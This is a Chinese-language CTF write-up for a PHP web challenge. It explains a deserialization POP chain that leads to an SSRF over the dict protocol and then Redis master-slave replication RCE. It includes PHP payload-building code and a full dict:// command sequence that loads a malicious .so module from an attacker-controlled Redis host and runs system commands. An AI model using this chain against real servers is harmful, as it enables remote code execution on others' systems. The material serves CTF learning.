# ezezez_php

> 分类：Web

## 题目描述

PHP 反序列化，通过 POP 链最终调用 `get($url)` 触发 Redis 主从复制 RCE。

## 考察知识点

- PHP 反序列化 POP 链
- Redis 主从复制 RCE（so 文件加载）
- dict 协议 SSRF

## 解法

POP 链：`Ha::__destruct() -> Rd::__call() -> Er::__set() -> get()`。

构造 payload（按顺序发，公网上建好 evil redis-server）：

```php
<?php
class Rd { public $ending; public $cl; public $poc; }
class Poc { public $payload; public $fun; }
class Er { public $symbol; public $Flag; }
class Ha { public $start; public $start1; public $start2; }

// dict 协议 payload 序列（按顺序发）
$payload = "dict://127.0.0.1:6379/system.exec:env"; // 最后一步执行命令

$Er = new Er();
$Er->Flag = base64_encode($payload);
$Rd = new Rd();
$Rd->cl = $Er;
$Ha = new Ha();
$Ha->start = ['POC'=>'0.o'];
$Ha->start1 = $Rd;
$Ha->start2 = 'o.0';
echo serialize($Ha);
?>
```

完整的 dict 协议攻击序列（参考 [Redis 主从复制 RCE](https://www.cnblogs.com/xiaozi/p/13089906.html)）：

```
dict://127.0.0.1:6379/config:set:dir:/tmp
dict://127.0.0.1:6379/config:set:dbfilename:exp.so
dict://127.0.0.1:6379/slaveof:x.x.x.x:7777
dict://127.0.0.1:6379/module:load:/tmp/exp.so
dict://127.0.0.1:6379/slave:no:one
dict://127.0.0.1:6379/system.exec:env
```

## 参考答案

（flag 通过 Redis 主从复制 RCE 执行命令读取）

## 来源

- 作者：末 初 | https://blog.csdn.net/mochu7777777/article/details/135760457
